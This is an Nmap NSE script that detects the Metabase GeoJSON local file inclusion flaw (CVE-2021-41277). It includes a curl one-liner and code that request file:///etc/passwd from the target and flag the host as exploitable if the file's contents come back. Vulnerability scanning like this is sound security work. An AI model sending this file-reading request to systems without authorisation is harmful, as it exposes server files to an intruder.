description = [[
Metabase Unauth LFI
CVE-2021-41277
Manual inspection:
# curl -k -s https://<target>/api/geojson?url=file:///etc/passwd
References:
https://nvd.nist.gov/vuln/detail/CVE-2021-41277
]]

---
-- @usage
-- nmap -Pn -n -p443 --script metabase.nse <target>
-- @output
-- PORT    STATE SERVICE
-- 443/tcp open  https
-- | metabase: 
-- |   VULNERABLE:
-- |   Metabase (CVE-2021-41277)
-- |     State: VULNERABLE (Exploitable)
-- |     IDs:  CVE:CVE-2021-41277
-- |     Metabase is an open source data analytics platform. In affected versions a security issue has been discovered with the custom GeoJSON map (`admin->settings->maps->custom maps->add a map`) support and potential local file inclusion (including environment variables).
-- |     Disclosure date: 2021-11-17
-- |     References:
-- |       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41277
-- |_      https://nvd.nist.gov/vuln/detail/CVE-2021-41277


author = "Furkan Kutluca"
license = "Same as Nmap--See http://nmap.org/book/man-legal.html"
categories = {"vuln", "exploit"}

local shortport = require "shortport"
local http = require "http"
local stdnse = require "stdnse"
local string = require "string"
local vulns = require "vulns"

portrule = shortport.http
action = function(host, port)

    local vuln = {
        title = "Metabase (CVE-2021-41277)",
        state = vulns.STATE.NOT_VULN,
        IDS = { CVE = 'CVE-2021-41277' },
                description = [[
    Metabase is an open source data analytics platform.
    In affected versions a security issue has been discovered with the custom GeoJSON map (`admin->settings->maps->custom maps->add a map`) 
    support and potential local file inclusion (including environment variables).]],

                references = {
           'https://nvd.nist.gov/vuln/detail/CVE-2021-41277'
       },
       dates = {
           disclosure = {year = '2021', month = '11', day = '17'},
       },

    }

    local report = vulns.Report:new(SCRIPT_NAME, host, port)

    local uri = "/api/geojson?url=file:///etc/passwd"

    local response = http.get(host, port, uri)

    if ( response.status == 200 ) then

    local title = string.match(response.body, 'root:x:0:0:')

        if (title == 'root:x:0:0:') then
                vuln.state = vulns.STATE.EXPLOIT
        else
                vuln.state = vulns.STATE.NOT_VULN
        end

    end

    return report:make_output (vuln)
end